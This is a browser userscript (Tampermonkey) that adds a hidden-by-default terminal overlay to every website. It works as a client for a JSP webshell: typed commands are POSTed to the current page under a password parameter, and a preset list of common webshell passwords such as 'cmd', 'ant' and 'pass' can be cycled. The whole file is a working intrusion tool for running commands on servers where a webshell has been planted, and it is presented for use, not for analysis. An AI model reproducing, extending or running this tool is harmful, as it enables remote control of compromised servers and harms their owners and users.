// ==UserScript==
// @name         Webshell_JSP
// @namespace    http://tampermonkey.net/
// @version      1.3
// @description  No
// @author       FengPwner
// @match        *://*/*
// @grant        none
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';
    // ================= 配置区域 =================
    // 预设密码，或在终端里用 /pass 命令切换
    let CURRENT_PASS = 'cmd';
    setTimeout(() => {
        const promptEl = document.getElementById('wt-prompt');
        if (promptEl) promptEl.textContent = `[${CURRENT_PASS}] $`;
    }, 500);
    const PASSWORD_LIST = ['cmd', 'x', 'hackhub', 'shell', 'a', 'pass', 'c', 'ant', 'pw'];
    // ===========================================
    const STYLES = `
        #wt-container {
            position: fixed; bottom: 20px; right: 20px; width: 600px; max-width: 95vw;
            background: rgba(20, 20, 20, 0.95); backdrop-filter: blur(10px);
            border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            font-family: 'Consolas', 'Monaco', monospace; color: #eee;
            z-index: 999999; overflow: hidden; border: 1px solid #333;
            transition: height 0.3s ease, opacity 0.3s ease;
            display: flex; flex-direction: column; height: 400px;
        }
        #wt-header {
            background: #2d2d2d; padding: 10px 15px; cursor: move;
            display: flex; justify-content: space-between; align-items: center;
            user-select: none; border-bottom: 1px solid #333;
        }
        .wt-dots { display: flex; gap: 8px; }
        .wt-dot { width: 12px; height: 12px; border-radius: 50%; cursor: pointer; }
        .wt-red { background: #ff5f56; }
        .wt-yellow { background: #ffbd2e; }
        .wt-green { background: #27c93f; }
        #wt-title { font-size: 12px; color: #aaa; font-weight: bold; letter-spacing: 1px; }
        #wt-body {
            flex: 1; padding: 15px; overflow-y: auto; font-size: 13px; line-height: 1.5;
            scrollbar-width: thin; scrollbar-color: #444 transparent;
        }
        #wt-input-area {
            display: flex; padding: 10px 15px; background: #1a1a1a;
            border-top: 1px solid #333; align-items: center;
        }
        #wt-prompt {
            color: #27c93f;
            margin-right: 10px;
            font-weight: bold;
            min-width: 60px;
            display: inline-block;
            }
        #wt-input {
            flex: 1; background: transparent; border: none; color: #fff;
            font-family: inherit; font-size: 14px; outline: none;
        }
        .log-line { margin-bottom: 4px; word-break: break-all; }
        .log-sys { color: #888; font-style: italic; }
        .log-cmd { color: #fff; }
        .log-res { color: #ccc; white-space: pre-wrap; }
        .log-err { color: #ff5f56; }
        .log-warn { color: #ffbd2e; }
        /* Minimized State */
        #wt-container.minimized { height: 40px !important; pointer-events: none; }
        #wt-container.minimized #wt-body,
        #wt-container.minimized #wt-input-area { display: none; }
        #wt-container.minimized #wt-header { pointer-events: auto; cursor: pointer; }
    `;  
    const styleSheet = document.createElement("style");
    styleSheet.innerText = STYLES;
    document.head.appendChild(styleSheet); 
    const container = document.createElement('div');
    container.id = 'wt-container';
    container.innerHTML = `
        <div id="wt-header">
            <div class="wt-dots">
                <div class="wt-dot wt-red" id="wt-min-btn" title="Minimize"></div>
                <div class="wt-dot wt-yellow"></div>
                <div class="wt-dot wt-green"></div>
            </div>
            <div id="wt-title">Webshell Terminal JSP by TNET-feng</div>
            <div style="width: 40px;"></div> <!-- Spacer -->
        </div>
        <div id="wt-body">
            <div class="log-line log-sys">System initialized...</div>
            <div class="log-line log-sys">Current Password: <span style="color:#fff">${CURRENT_PASS}</span></div>
            <div class="log-line log-warn">Tip: Run "/pass [new_password]" to change password.</div>
            <div class="log-line log-warn">Tip: Run "/list" to see password list.</div>
            <br>
        </div>
        <div id="wt-input-area">
            <span id="wt-prompt">&gt;</span>
            <input type="text" id="wt-input" placeholder="Type command..." autocomplete="off" spellcheck="false">
        </div>
    `;
    document.body.appendChild(container);    
    const body = document.getElementById('wt-body');
    const input = document.getElementById('wt-input');
    const header = document.getElementById('wt-header');
    const minBtn = document.getElementById('wt-min-btn');
    let isMinimized = false;    
    toggleMinimize();    
    function log(msg, type = 'sys') {
        const div = document.createElement('div');
        div.className = `log-line log-${type}`;
        div.textContent = msg;
        body.appendChild(div);
        body.scrollTop = body.scrollHeight;
    }    
    function toggleMinimize() {
        isMinimized = !isMinimized;
        if (isMinimized) container.classList.add('minimized');
        else container.classList.remove('minimized');
    }
    minBtn.addEventListener('click', (e) => { e.stopPropagation(); toggleMinimize(); });
    header.addEventListener('click', toggleMinimize);    
    let isDragging = false;
    let startX, startY, initialLeft, initialTop;       
        const startDrag = (e) => {          
            if (e.target.classList.contains('wt-dot')) return;
            isDragging = true;           
            const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
            const clientY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;        
            startX = clientX - container.offsetLeft;
            startY = clientY - container.offsetTop;     
          if (e.type.includes('touch')) {
       }
    };        
        const onDrag = (e) => {
        if (!isDragging) return;      
        e.preventDefault();
        const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
        const clientY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
        container.style.left = (clientX - startX) + 'px';
        container.style.top = (clientY - startY) + 'px';        
        container.style.bottom = 'auto';
        container.style.right = 'auto';
   };        
        const stopDrag = () => {
        isDragging = false;

};
             header.addEventListener('mousedown', startDrag);
             header.addEventListener('touchstart', startDrag, { passive: false });                          document.addEventListener('mousemove', onDrag);
             document.addEventListener('touchmove', onDrag, { passive: false });             
             document.addEventListener('mouseup', stopDrag);
             document.addEventListener('touchend', stopDrag);        
    async function sendCommand(cmd) {
        log(`> ${cmd}`, 'cmd');        
        if (cmd.startsWith('/')) {
            const parts = cmd.split(' ');
            const action = parts[0].toLowerCase();
            if (action === '/pass' && parts[1]) {
                CURRENT_PASS = parts[1];
                log(`Password changed to: ${CURRENT_PASS}`, 'warn');                document.getElementById('wt-prompt').textContent = `[${CURRENT_PASS}] $`;
            } else if (action === '/list') {
                log(`Available presets: ${PASSWORD_LIST.join(', ')}`, 'sys');
            } else if (action === '/help') {
                log("Commands: /pass [name], /list, /help", 'sys');
            }
            return;
        }
        const payload = new URLSearchParams();
        payload.append(CURRENT_PASS, cmd);
        try {
            const response = await fetch(window.location.href, {
                method: 'POST',               
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: payload.toString()
            });

            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            const text = await response.text();            
            let cleanText = text;
            if (text.includes('<html') || text.includes('<!DOCTYPE')) {
                 const parser = new DOMParser();
                 const doc = parser.parseFromString(text, 'text/html');
                 cleanText = doc.body ? doc.body.innerText : text;
            }
            if (cleanText.trim() === '') {
                log('[Empty Response] Check password or command syntax.', 'err');
            } else {
                log(cleanText, 'res');
            }
        } catch (err) {
            log(`Error: ${err.message}`, 'err');
        }
    }    
    input.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            const val = input.value.trim();
            if (val) {
                sendCommand(val);
                input.value = '';
            }
        }
    });

})();
